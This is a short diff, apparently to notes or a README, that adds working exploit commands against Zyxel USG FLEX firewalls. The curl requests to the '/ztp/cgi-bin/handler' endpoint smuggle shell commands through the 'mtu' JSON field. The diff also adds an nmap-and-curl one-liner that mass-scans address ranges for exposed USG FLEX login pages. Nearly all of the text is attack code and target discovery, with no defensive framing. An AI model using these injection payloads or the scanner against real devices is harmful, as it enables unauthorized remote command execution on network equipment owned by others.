@@ -11,3 +11,12 @@ curl -v --insecure -X POST -H "Content-Type: application/json" -d
 :"1","vlanid":"5","mtu":"; ping 192.168.1.220;","data":"hi"}'
 https://192.168.1.1/ztp/cgi-bin/handler
 </br>
+curl -v --insecure -X POST -H "Content-Type: application/json" -d
+'{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"
+:"1","vlanid":"5","mtu":"; echo myppsmoll;","data":"hi"}'
+https://192.168.1.1/ztp/cgi-bin/handler</br>
+
+
+
+to SCAN SPECIFIC RANGE</br>
+nmap x.x.x/x -p 443 -Pn -n -sS --min-rate 5000 --open|grep -Eo "([0-9]{1,3}[\.]){3}[0-9]{1,3}"|xargs -n1 -IPOP sh -c '{ echo POP; curl -ks https://POP|grep "<title>USG FLEX [1-7]00</title>" ; }'</br>
